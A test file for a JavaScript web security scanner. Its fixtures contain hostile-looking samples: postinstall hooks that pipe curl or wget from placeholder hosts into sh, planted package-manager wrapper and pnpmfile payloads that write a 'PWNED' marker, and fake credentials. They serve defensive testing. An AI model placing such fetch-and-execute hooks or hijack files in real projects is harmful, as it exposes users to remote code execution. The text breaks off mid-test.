import assert from "node:assert/strict";
import { promises as fs } from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";

import { collectFiles } from "../src/core/files.js";
import { detectWebProject } from "../src/core/project.js";
import { writeScanReports } from "../src/core/reporter.js";
import { runSecurityScan } from "../src/scanners/security.js";
import { runSiteScan } from "../src/scanners/mysite.js";

async function fixture(t, entries, collectOptions = {}) {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "modular-scanner-"));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  for (const [relative, value] of Object.entries(entries)) {
    const destination = path.join(root, relative);
    await fs.mkdir(path.dirname(destination), { recursive: true });
    await fs.writeFile(destination, typeof value === "string" ? value : JSON.stringify(value, null, 2));
  }
  const inventory = await collectFiles(root, collectOptions);
  const webDetection = await detectWebProject({ root, files: inventory.files });
  return { root, ...inventory, webDetection };
}

async function auditSpy(t, manager) {
  const directory = await fs.mkdtemp(path.join(os.tmpdir(), `modular-${manager}-audit-spy-`));
  t.after(() => fs.rm(directory, { recursive: true, force: true }));
  const marker = path.join(directory, "CALLED");
  const runnerName = manager === "npm"
    ? "npm-cli.cjs"
    : (process.platform === "win32" ? "audit-runner.cjs" : manager);
  const runner = path.join(directory, runnerName);
  const source = [
    ...(process.platform === "win32" || manager === "npm" ? [] : ["#!/usr/bin/env node"]),
    `require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'yes');`,
    "process.stdout.write(JSON.stringify({ metadata: { vulnerabilities: { total: 0 } }, vulnerabilities: {} }));",
  ].join("\n");
  await fs.writeFile(runner, source);
  if (process.platform !== "win32" && manager !== "npm") await fs.chmod(runner, 0o755);
  if (process.platform === "win32" && manager !== "npm") {
    await fs.writeFile(path.join(directory, `${manager}.cmd`), `@"%~dp0${runnerName}" %*\r\n`);
  }
  return { directory, marker, runner };
}

test("security scan reports actionable risks and never emits a literal secret", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      scripts: { dev: "vite" },
      dependencies: { react: "latest", "react-dom": "latest" },
      devDependencies: { vite: "latest" },
    },
    "index.html": "<!doctype html><html><body><main id=\"root\"></main></body></html>",
    "src/App.jsx": [
      "const cloudKey = 'AKIAABCDEFGHIJKLMNOP';",
      "export function App({ html }) {",
      "  localStorage.setItem('accessToken', 'demo');",
      "  return <main dangerouslySetInnerHTML={{ __html: html }} />;",
      "}",
    ].join("\n"),
  });
  assert.equal(project.webDetection.isWebsite, true);
  const progress = [];
  const result = await runSecurityScan({
    ...project,
    onProgress: (state) => progress.push(state),
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  assert.equal(result.mode, "security");
  assert.ok(result.checks >= 20);
  assert.ok(result.filesScanned >= 2);
  assert.ok(result.findings.some((finding) => finding.id === "security.embedded-secrets"));
  assert.ok(result.findings.some((finding) => finding.file === "src/App.jsx" && finding.line));
  assert.ok(progress.some((state) => state.file === "src/App.jsx"));
  assert.doesNotMatch(JSON.stringify(result), /AKIAABCDEFGHIJKLMNOP/);
  assert.match(JSON.stringify(result), /redacted/i);
});

test("security scan prefers the root manifest and checks every workspace manifest", async (t) => {
  const project = await fixture(t, {
    "aaa/package.json": {
      dependencies: { "workspace-floating": "latest" },
    },
    "aaa/pnpm-lock.yaml": "lockfileVersion: '9.0'\npackages: {}\n",
    "test/fixtures/package.json": {
      scripts: { postinstall: "curl https://fixture.invalid/install.sh | sh" },
      dependencies: { "fixture-only": "*" },
    },
    "package.json": {
      private: true,
      scripts: { dev: "vite", postinstall: "curl https://downloads.invalid/install.sh | sh" },
      dependencies: { react: "latest", vite: "latest" },
    },
    "package-lock.json": { name: "root", lockfileVersion: 3, packages: {} },
    "index.html": "<!doctype html><html><body><main id=\"root\"></main></body></html>",
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(result.findings.some((finding) => finding.id === "security.package-scripts" && finding.file === "package.json"));
  assert.ok(result.findings.some((finding) => finding.id === "security.dependency-hygiene" && finding.file === "package.json"));
  assert.ok(result.findings.some((finding) => finding.id === "security.dependency-hygiene" && finding.file === "aaa/package.json"));
  assert.equal(result.findings.some((finding) => finding.id === "security.lockfile" && /multiple/i.test(finding.title)), false);
  assert.equal(result.findings.some((finding) => finding.file === "test/fixtures/package.json"), false);
  assert.equal(result.metadata.dependencyAudit.status, "skipped");
  assert.match(result.metadata.dependencyAudit.reason, /opt in/i);
  assert.equal(result.checks, 32);
  assert.equal(result.metadata.checkCount, 32);
  assert.equal(result.metadata.checks.find((check) => check.id === "dependency-advisories")?.status, "skipped");
  assert.match(result.metadata.coverage["Dependency advisory lookup"], /skipped/i);
});

test("security finding evidence cannot leak an adjacent unknown credential", async (t) => {
  const adjacentSecret = "correct horse battery staple!";
  const project = await fixture(t, {
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
    "src/app.js": `const password = "${adjacentSecret}"; element.innerHTML = input;`,
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  const xss = result.findings.find((finding) => finding.id === "security.dom-xss");
  const embedded = result.findings.find((finding) => finding.id === "security.embedded-secrets");
  assert.ok(xss);
  assert.ok(embedded);
  assert.doesNotMatch(JSON.stringify(result), new RegExp(adjacentSecret));
  assert.match(embedded.evidence, /redacted/i);
});

test("credential aliases are detected and never leak through scanner results or reports", async (t) => {
  const values = {
    credentials: "correct horse battery staple!",
    passphrase: "violet orchard river stone!",
    jwt: "header.payload.signature-value",
    authCookie: "session-cookie-value!",
    compoundToken: "compound token should stay private!",
    computedPassword: "computed password should stay private!",
    structuredCredentials: "structured secret should stay private!",
    storedSession: "stored session should stay private!",
    cookiePayload: "cookie payload should stay private!",
    curlPassword: "curl-password-should-stay-private",
    wgetPassword: "wget-password-should-stay-private",
    databasePassword: "database-password-should-stay-private",
    databasePassAlias: "database-pass-alias-should-stay-private",
    phpSessionId: "php-session-id-should-stay-private",
    transportToken: "transport-token-should-stay-private",
    yamlBlockSecret: "yaml-block-secret-should-stay-private",
  };
  const project = await fixture(t, {
    "package.json": {
      private: true,
      scripts: {
        postinstall: [
          `curl -u admin:${values.curlPassword} https://example.com/install | sh`,
          "cat > config.yml <<'EOF'",
          "token: |",
          `  ${values.yamlBlockSecret}`,
          "EOF",
        ].join("\n"),
        prepare: `wget --user admin --password ${values.wgetPassword} https://example.com/install | sh`,
      },
    },
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
    ".env.production": [
      `DB_PASS=${values.databasePassAlias}`,
      `PHPSESSID=${values.phpSessionId}`,
    ].join("\n"),
    "src/app.js": [
      `element.innerHTML = credentials = "${values.credentials}";`,
      `const passphrase = "${values.passphrase}";`,
      `const jwt: string = "${values.jwt}";`,
      `const authCookie = "${values.authCookie}";`,
      `element.outerHTML = token ??= "${values.compoundToken}";`,
      `element.insertAdjacentHTML("beforeend", config["password"] ||= "${values.computedPassword}");`,
      `const credentialsBackup = ["${values.structuredCredentials}"];`,
      `localStorage.setItem("session", "${values.storedSession}");`,
      `document.cookie = "session=${values.cookiePayload}; path=/";`,
      `const databaseUrl = "postgres://admin:${values.databasePassword}@db.production.internal/app";`,
      `fetch("http://${values.transportToken}@api.production.internal/account");`,
    ].join("\n"),
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  const serialized = JSON.stringify(result);
  for (const value of Object.values(values)) assert.doesNotMatch(serialized, new RegExp(value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  assert.ok(result.findings.some((finding) => finding.id === "security.dom-xss"));
  assert.ok(result.findings.some((finding) => finding.id === "security.browser-storage"));
  assert.ok(result.findings.some((finding) => finding.id === "security.cookie-flags"));
  assert.ok(result.findings.some((finding) => finding.id === "security.package-scripts"));
  assert.ok(result.findings.some((finding) => finding.id === "security.insecure-transport"));
  const embeddedDescriptions = result.findings
    .filter((finding) => finding.id === "security.embedded-secrets")
    .map((finding) => finding.description)
    .join("\n");
  for (const alias of ["credentials", "passphrase", "jwt", "authCookie", "token", "password", "credentialsBackup", "databaseUrl", "DB_PASS", "PHPSESSID"]) {
    assert.match(embeddedDescriptions, new RegExp(alias, "i"));
  }
  assert.match(serialized, /redacted/i);
  assert.doesNotMatch(serialized, /<redacted>>/);

  const reportPaths = await writeScanReports(result, {
    outputDirectory: path.join(project.root, "Modular"),
  });
  const reports = (await Promise.all(reportPaths.map((reportPath) => fs.readFile(reportPath, "utf8")))).join("\n");
  for (const value of Object.values(values)) assert.doesNotMatch(reports, new RegExp(value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
});

test("dynamic credential containers are redacted without being reported as hardcoded secrets", async (t) => {
  const project = await fixture(t, {
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
    "src/app.js": [
      "const credentials = { username, password };",
      'const credentialOptions = { strategy: "credentials", provider: "corporate-sso", username, password };',
      "const password = (formData.get('password'));",
      "const tokens = [accessToken, refreshToken];",
    ].join("\n"),
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  assert.equal(result.findings.some((finding) => finding.id === "security.embedded-secrets"), false);
});

test("credential configuration descriptors are not mistaken for literal secret values", async (t) => {
  const project = await fixture(t, {
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
    ".env": [
      "GOOGLE_APPLICATION_CREDENTIALS=/var/run/secrets/service-account.json",
      "AUTH_MODE=redirect-flow",
      "TOKEN_ENDPOINT=https://identity.production.internal/token",
      "PASSWORD_POLICY=strict-production-policy",
      "SESSION_TIMEOUT=3600",
    ].join("\n"),
    "src/auth.js": [
      'const credentialsProvider = "corporate-sso";',
      'const passwordPolicy = "minimum-characters";',
    ].join("\n"),
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  assert.equal(result.findings.some((finding) => finding.id === "security.embedded-secrets"), false);
});

test("general security SAST masks inline comments without hiding URLs or credentials", async (t) => {
  const commentedSecret = "AKIAABCDEFGHIJKLMNOP";
  const project = await fixture(t, {
    "index.html": [
      "<!doctype html><html><body><main>Site</main>",
      "<section>Content</section><!-- eval(userInput); element.innerHTML = userInput; http://comment.invalid -->",
      "</body></html>",
    ].join("\r\n"),
    "src/comments.ts": [
      "const endpoint = 'http://api.example.com/data';",
      "const template = `https://cdn.example.com//asset`;",
      "const note = 1; // eval(userInput); element.innerHTML = userInput; fetch('http://inline.invalid');",
      `const secretNote = 2; // ${commentedSecret}`,
      "/* eval(userInput); element.innerHTML = userInput; fetch('http://block.invalid'); */",
      "export { endpoint, template, note, secretNote };",
    ].join("\r\n"),
    "styles.css": ".hero { background-image: url(https://cdn.example.com//hero.png); } /* background: url(http://css-comment.invalid); */",
    "styles.scss": "$color: #fff; // eval(userInput); background: url(http://scss-comment.invalid);",
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  assert.equal(result.findings.some((finding) => finding.id === "security.dynamic-code"), false);
  assert.equal(result.findings.some((finding) => finding.id === "security.dom-xss"), false);
  const insecureTransport = result.findings.filter((finding) => finding.id === "security.insecure-transport");
  assert.equal(insecureTransport.length, 1);
  assert.equal(insecureTransport[0].file, "src/comments.ts");
  assert.equal(insecureTransport[0].line, 1);
  assert.match(insecureTransport[0].evidence, /api\.example\.com/);
  const secret = result.findings.find((finding) => finding.id === "security.embedded-secrets" && finding.file === "src/comments.ts");
  assert.ok(secret);
  assert.equal(secret.line, 4);
  assert.doesNotMatch(JSON.stringify(result), new RegExp(commentedSecret));
});

test("credential scan inspects documentation files", async (t) => {
  const awsKey = "AKIAQRSTUVWXYZABCDEF";
  const project = await fixture(t, {
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
    "README.md": `Deployment key: ${awsKey}\n`,
  });
  const progress = [];
  const result = await runSecurityScan({
    ...project,
    onProgress: (state) => progress.push(state),
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  assert.ok(result.findings.some((finding) => finding.id === "security.embedded-secrets" && finding.file === "README.md"));
  assert.doesNotMatch(JSON.stringify(result), new RegExp(awsKey));
  assert.ok(progress.some((state) => state.file === "README.md"));
});

test("credential scan inspects test environments and fixture sources without running general SAST there", async (t) => {
  const fixtureKey = "AKIAQRSTUVWXYZABCDEF";
  const project = await fixture(t, {
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
    ".env.test": "API_SECRET=QwErTyUiOpAsDfGhJkLzXcVb\n",
    "fixtures/example.js": `const key = "${fixtureKey}"; element.innerHTML = fixtureHtml;\n`,
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  assert.ok(result.findings.some((finding) => finding.id === "security.embedded-secrets" && finding.file === ".env.test"));
  assert.ok(result.findings.some((finding) => finding.id === "security.embedded-secrets" && finding.file === "fixtures/example.js"));
  assert.equal(result.findings.some((finding) => finding.id === "security.dom-xss" && finding.file === "fixtures/example.js"), false);
  assert.doesNotMatch(JSON.stringify(result), new RegExp(`QwErTyUiOpAsDfGhJkLzXcVb|${fixtureKey}`));
});

test("security SAST preserves root and monorepo framework routes named docs, test, and generated", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, workspaces: ["apps/*"], dependencies: { next: "latest", react: "latest", "react-dom": "latest" } },
    "apps/web/package.json": { private: true, dependencies: { next: "latest", react: "latest", "react-dom": "latest" } },
    "app/layout.tsx": "export default function Layout({ children }) { return <html><body>{children}</body></html>; }",
    "app/docs/page.tsx": "export default function Docs({ html }) { document.body.innerHTML = html; return <main>Docs</main>; }",
    "app/test/page.tsx": "export default function TestRoute({ html }) { element.innerHTML = html; return <main>Test</main>; }",
    "app/generated/page.tsx": "export default function GeneratedRoute({ html }) { target.innerHTML = html; return <main>Generated</main>; }",
    "apps/web/app/docs/page.tsx": "export default function Docs({ html }) { document.body.innerHTML = html; return <main>Docs</main>; }",
    "apps/web/app/test/page.tsx": "export default function TestRoute({ html }) { element.innerHTML = html; return <main>Test</main>; }",
    "apps/web/app/generated/page.tsx": "export default function GeneratedRoute({ html }) { target.innerHTML = html; return <main>Generated</main>; }",
    "docs/example.js": "document.body.innerHTML = documentationHtml;",
    "tests/example.js": "document.body.innerHTML = testHtml;",
    "fixtures/example.js": "document.body.innerHTML = fixtureHtml;",
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  for (const route of [
    "app/docs/page.tsx",
    "app/test/page.tsx",
    "app/generated/page.tsx",
    "apps/web/app/docs/page.tsx",
    "apps/web/app/test/page.tsx",
    "apps/web/app/generated/page.tsx",
  ]) {
    assert.ok(result.findings.some((finding) => finding.id === "security.dom-xss" && finding.file === route), route);
  }
  for (const auxiliary of ["docs/example.js", "tests/example.js", "fixtures/example.js"]) {
    assert.equal(result.findings.some((finding) => finding.id === "security.dom-xss" && finding.file === auxiliary), false, auxiliary);
  }
});

test("security-header names in source comments do not count as configured headers", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "latest" } },
    "index.html": [
      "<!doctype html><html><body><main>Site</main>",
      "<!-- TODO Content-Security-Policy -->",
      "</body></html>",
    ].join("\n"),
    "server.js": [
      "// TODO: Content-Security-Policy, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, X-Frame-Options",
      "/* These headers still need to be configured at deployment. */",
      "export const serverReady = true;",
    ].join("\n"),
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  const finding = result.findings.find((entry) => entry.id === "security.security-headers" && /incomplete/i.test(entry.title));
  assert.ok(finding);
  assert.match(finding.description, /Content-Security-Policy/);
  assert.match(finding.description, /X-Content-Type-Options/);
  assert.match(finding.description, /Referrer-Policy/);
  assert.match(finding.description, /Permissions-Policy/);
  assert.match(finding.description, /X-Frame-Options/);
});

test("security scan traces direct browser URL data into redirect and popup sinks", async (t) => {
  const project = await fixture(t, {
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
    "src/navigation.js": [
      "window.location.assign(new URL(window.location.href).searchParams.get('next'));",
      "window.open(new URLSearchParams(window.location.search).get('popup'));",
      "const safePath = '/account';",
      "window.location.href = safePath;",
      "const returnTo = new URLSearchParams(window.location.search).get('returnTo');",
      "window.location.replace(returnTo);",
      "const validated = new URLSearchParams(window.location.search).get('validated');",
      "if (!validated.startsWith('/')) throw new Error('invalid redirect');",
      "window.location.assign(validated);",
    ].join("\n"),
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  const findings = result.findings.filter((finding) => finding.id === "security.untrusted-navigation");
  assert.equal(findings.length, 3);
  assert.deepEqual(findings.map((finding) => finding.line), [1, 2, 6]);
  assert.ok(findings.every((finding) => finding.file === "src/navigation.js"));
  assert.ok(findings.every((finding) => finding.evidence && finding.recommendation));
  assert.equal(findings.some((finding) => finding.line === 4), false);
  assert.equal(findings.some((finding) => finding.line === 9), false);
});

test("security scan identifies multiline weak CSP directives", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { next: "latest", react: "latest" } },
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
    "next.config.js": [
      "export default { async headers() { return [{ source: '/(.*)', headers: [{",
      "  key: 'Content-Security-Policy',",
      "  value: [\"default-src 'self'\", \"script-src 'self' 'unsafe-eval'\"].join('; ')",
      "}] }]; } };",
    ].join("\n"),
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  const finding = result.findings.find((entry) => entry.id === "security.security-headers" && /unsafe-eval/i.test(entry.title));
  assert.ok(finding);
  assert.equal(finding.file, "next.config.js");
  assert.equal(finding.line, 3);
  assert.match(finding.evidence, /unsafe-eval/i);
  assert.match(finding.recommendation, /nonce|hash/i);
});

test("CSP inspection stays inside the declared value and preserves comment offsets", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "latest" } },
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
    "server.js": [
      "const policy = {",
      "  key: 'Content-Security-Policy',",
      "  value: \"default-src 'self'; object-src 'none'; frame-ancestors 'none'\"",
      "};",
      "const unrelatedExample = \"'unsafe-eval'\";",
      "const safeHeader = \"Content-Security-Policy: default-src 'self'; object-src 'none'\"; const unrelatedInline = \"'unsafe-inline'\";",
    ].join("\n"),
    "headers.js": [
      `// ${"padding".repeat(80)} Content-Security-Policy: script-src 'unsafe-inline'`,
      "export const weakHeader = \"Content-Security-Policy: script-src *\";",
    ].join("\n"),
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  const weakPolicies = result.findings.filter((entry) => entry.id === "security.security-headers" && /permits/i.test(entry.title));
  assert.equal(weakPolicies.length, 1);
  assert.equal(weakPolicies[0].file, "headers.js");
  assert.equal(weakPolicies[0].line, 2);
  assert.match(weakPolicies[0].title, /wildcard/i);
});

test("security scan reports risky iframe isolation patterns", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "latest" } },
    "index.html": [
      "<!doctype html><html><body><main>Site</main>",
      "<iframe src=\"https://widgets.example.com/embed\" title=\"Widget\"></iframe>",
      "<iframe src=\"https://isolated.example.com\" sandbox=\"allow-scripts allow-same-origin\"></iframe>",
      "<iframe data-src=\"https://lazy.example.com\" data-srcdoc={ignored} data-sandbox=\"allow-scripts allow-same-origin\"></iframe>",
      "<iframe src=\"https://actual.example.com\" data-sandbox=\"allow-scripts allow-same-origin\"></iframe>",
      "<iframe src=\"https://quoted.example.com\" title=\"sandbox='allow-scripts allow-same-origin'\"></iframe>",
      "<iframe-card src=\"https://component.example.com\"></iframe-card>",
      "</body></html>",
    ].join("\n"),
    "src/Preview.jsx": "export const Preview = ({ articleHtml }) => <iframe title=\"Preview\" srcDoc={articleHtml} />;",
  });
  const result = await runSecurityScan({
    ...project,
    options: { webDetection: project.webDetection, auditDependencies: false },
  });

  const iframeFindings = result.findings.filter((finding) => finding.id === "security.embedded-content");
  assert.equal(iframeFindings.length, 5);
  assert.ok(iframeFindings.some((finding) => /Third-party iframe/i.test(finding.title) && finding.file === "index.html" && finding.line === 2));
  assert.ok(iframeFindings.some((finding) => /allow-scripts and allow-same-origin/i.test(finding.title) && finding.line === 3));
  assert.ok(iframeFindings.some((finding) => /srcdoc/i.test(finding.title) && finding.file === "src/Preview.jsx"));
  assert.ok(iframeFindings.some((finding) => /Third-party iframe/i.test(finding.title) && finding.file === "index.html" && finding.line === 5));
  assert.ok(iframeFindings.some((finding) => /Third-party iframe/i.test(finding.title) && finding.file === "index.html" && finding.line === 6));
  assert.equal(iframeFindings.some((finding) => finding.file === "index.html" && finding.line === 4), false);
  assert.equal(iframeFindings.some((finding) => finding.file === "index.html" && finding.line === 7), false);
  assert.ok(iframeFindings.every((finding) => finding.evidence && finding.recommendation && finding.suggestedFiles.length > 0));
});

test("per-rule detail caps retain a later critical security finding", async (t) => {
  const project = await fixture(t, {
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
    "a.js": [
      "const accessTokenOne = 'MediumValueNumberOne123!';",
      "const accessTokenTwo = 'MediumValueNumberTwo123!';",
    ].join("\n"),
    "z.js": "const leaked = 'AKIAABCDEFGHIJKLMNOP';",
  });
  const result = await runSecurityScan({
    ...project,
    options: {
      webDetection: project.webDetection,
      auditDependencies: false,
      maxFindingsPerRule: 2,
    },
  });

  const retained = result.findings.filter((finding) => finding.id === "security.embedded-secrets");
  assert.equal(retained.length, 2);
  assert.ok(retained.some((finding) => finding.severity === "critical" && finding.file === "z.js"));
  assert.equal(result.summary.counts.critical, 1);
  assert.equal(result.metadata.suppressedByRule["embedded-secrets"], 1);
  assert.equal(result.metadata.suppressedSeverityByRule["embedded-secrets"].medium, 1);
});

test("dependency audit honors a pnpm declaration and ignores a stale npm lockfile", async (t) => {
  const npmSpy = await auditSpy(t, "npm");
  const pnpmSpy = await auditSpy(t, "pnpm");
  const project = await fixture(t, {
    "package.json": {
      private: true,
      packageManager: "pnpm@9.0.0",
      dependencies: { react: "1.0.0" },
    },
    "package-lock.json": { name: "stale-npm-graph", lockfileVersion: 3, packages: {} },
    "pnpm-lock.yaml": "lockfileVersion: '9.0'\npackages: {}\n",
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
  });
  const originalPath = process.env.PATH;
  const originalNpmExecPath = process.env.npm_execpath;
  try {
    process.env.PATH = [pnpmSpy.directory, npmSpy.directory, path.dirname(process.execPath)].join(path.delimiter);
    process.env.npm_execpath = npmSpy.runner;
    const result = await runSecurityScan({
      ...project,
      options: { webDetection: project.webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
    });

    assert.equal(result.metadata.dependencyAudit.status, "completed");
    assert.equal(result.metadata.dependencyAudit.audits[0].manager, "pnpm");
    assert.equal(result.metadata.dependencyAudit.audits[0].lockfile, "pnpm-lock.yaml");
    await fs.access(pnpmSpy.marker);
    await assert.rejects(fs.access(npmSpy.marker), (error) => error?.code === "ENOENT");
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
    if (originalNpmExecPath === undefined) delete process.env.npm_execpath;
    else process.env.npm_execpath = originalNpmExecPath;
  }
});

test("dependency audit honors an npm declaration and ignores a stale pnpm lockfile", async (t) => {
  const npmSpy = await auditSpy(t, "npm");
  const pnpmSpy = await auditSpy(t, "pnpm");
  const project = await fixture(t, {
    "package.json": {
      private: true,
      packageManager: "npm@10.0.0",
      dependencies: { react: "1.0.0" },
    },
    "package-lock.json": { name: "npm-graph", lockfileVersion: 3, packages: {} },
    "pnpm-lock.yaml": "lockfileVersion: '9.0'\npackages: {}\n",
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
  });
  const originalPath = process.env.PATH;
  const originalNpmExecPath = process.env.npm_execpath;
  try {
    process.env.PATH = [pnpmSpy.directory, npmSpy.directory, path.dirname(process.execPath)].join(path.delimiter);
    process.env.npm_execpath = npmSpy.runner;
    const result = await runSecurityScan({
      ...project,
      options: { webDetection: project.webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
    });

    assert.equal(result.metadata.dependencyAudit.status, "completed");
    assert.equal(result.metadata.dependencyAudit.audits[0].manager, "npm");
    assert.equal(result.metadata.dependencyAudit.audits[0].lockfile, "package-lock.json");
    await fs.access(npmSpy.marker);
    await assert.rejects(fs.access(pnpmSpy.marker), (error) => error?.code === "ENOENT");
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
    if (originalNpmExecPath === undefined) delete process.env.npm_execpath;
    else process.env.npm_execpath = originalNpmExecPath;
  }
});

test("dependency audit fails closed when sibling lockfiles are ambiguous", async (t) => {
  const npmSpy = await auditSpy(t, "npm");
  const pnpmSpy = await auditSpy(t, "pnpm");
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "1.0.0" } },
    "package-lock.json": { name: "npm-graph", lockfileVersion: 3, packages: {} },
    "pnpm-lock.yaml": "lockfileVersion: '9.0'\npackages: {}\n",
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
  });
  const originalPath = process.env.PATH;
  const originalNpmExecPath = process.env.npm_execpath;
  try {
    process.env.PATH = [pnpmSpy.directory, npmSpy.directory, path.dirname(process.execPath)].join(path.delimiter);
    process.env.npm_execpath = npmSpy.runner;
    const result = await runSecurityScan({
      ...project,
      options: { webDetection: project.webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
    });

    assert.equal(result.metadata.dependencyAudit.status, "unavailable");
    assert.match(result.metadata.dependencyAudit.audits[0].reason, /multiple package-manager lockfiles.*does not declare/i);
    await assert.rejects(fs.access(npmSpy.marker), (error) => error?.code === "ENOENT");
    await assert.rejects(fs.access(pnpmSpy.marker), (error) => error?.code === "ENOENT");
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
    if (originalNpmExecPath === undefined) delete process.env.npm_execpath;
    else process.env.npm_execpath = originalNpmExecPath;
  }
});

test("dependency audit does not use a lockfile that conflicts with packageManager", async (t) => {
  const npmSpy = await auditSpy(t, "npm");
  const project = await fixture(t, {
    "package.json": {
      private: true,
      packageManager: "pnpm@9.0.0",
      dependencies: { react: "1.0.0" },
    },
    "package-lock.json": { name: "stale-npm-graph", lockfileVersion: 3, packages: {} },
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
  });
  const originalPath = process.env.PATH;
  const originalNpmExecPath = process.env.npm_execpath;
  try {
    process.env.PATH = [npmSpy.directory, path.dirname(process.execPath)].join(path.delimiter);
    process.env.npm_execpath = npmSpy.runner;
    const result = await runSecurityScan({
      ...project,
      options: { webDetection: project.webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
    });

    assert.equal(result.metadata.dependencyAudit.status, "unavailable");
    assert.match(result.metadata.dependencyAudit.audits[0].reason, /declares pnpm.*no matching pnpm-lock\.yaml.*stale lockfile/i);
    await assert.rejects(fs.access(npmSpy.marker), (error) => error?.code === "ENOENT");
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
    if (originalNpmExecPath === undefined) delete process.env.npm_execpath;
    else process.env.npm_execpath = originalNpmExecPath;
  }
});

test("dependency audit never executes a package-manager wrapper from the scanned repository", {
  skip: process.platform !== "win32" && "Windows wrapper resolution regression",
}, async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      packageManager: "pnpm@9.0.0",
      dependencies: { react: "1.0.0" },
    },
    "pnpm-lock.yaml": "lockfileVersion: '9.0'\npackages: {}\n",
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
    "pnpm.cmd": "@\"%~dp0payload.cjs\" %*\r\n",
    "payload.cjs": "require('node:fs').writeFileSync('audit-hijacked.txt', 'executed');\n",
  });
  const marker = path.join(project.root, "audit-hijacked.txt");
  const originalPath = process.env.PATH;
  try {
    process.env.PATH = project.root;
    const result = await runSecurityScan({
      ...project,
      options: {
        webDetection: project.webDetection,
        auditDependencies: true,
        dependencyAuditTimeoutMs: 1_000,
      },
    });
    assert.equal(result.metadata.dependencyAudit.status, "unavailable");
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
  }
  await assert.rejects(fs.access(marker), (error) => error?.code === "ENOENT");
});

test("dependency audit runs outside the repository and cannot load a pnpmfile hook", {
  skip: process.platform !== "win32" && "Windows package-manager wrapper fixture",
}, async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      packageManager: "pnpm@9.0.0",
      dependencies: { react: "1.0.0" },
    },
    "pnpm-lock.yaml": "lockfileVersion: '9.0'\npackages: {}\n",
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
    ".pnpmfile.cjs": "require('node:fs').writeFileSync(require('node:path').join(__dirname, 'PWNED'), 'executed'); module.exports = {};\n",
  });
  const toolDirectory = await fs.mkdtemp(path.join(os.tmpdir(), "modular-audit-tool-"));
  t.after(() => fs.rm(toolDirectory, { recursive: true, force: true }));
  await fs.writeFile(path.join(toolDirectory, "pnpm.cmd"), "@\"%~dp0audit-runner.cjs\" %*\r\n");
  await fs.writeFile(path.join(toolDirectory, "audit-runner.cjs"), [
    "const fs = require('node:fs');",
    "const path = require('node:path');",
    "const hook = path.join(process.cwd(), '.pnpmfile.cjs');",
    "if (fs.existsSync(hook)) require(hook);",
    "process.stdout.write(JSON.stringify({ metadata: { vulnerabilities: { total: 0 } }, vulnerabilities: {} }));",
  ].join("\n"));

  const originalPath = process.env.PATH;
  try {
    process.env.PATH = toolDirectory;
    const result = await runSecurityScan({
      ...project,
      options: {
        webDetection: project.webDetection,
        auditDependencies: true,
        dependencyAuditTimeoutMs: 1_000,
      },
    });
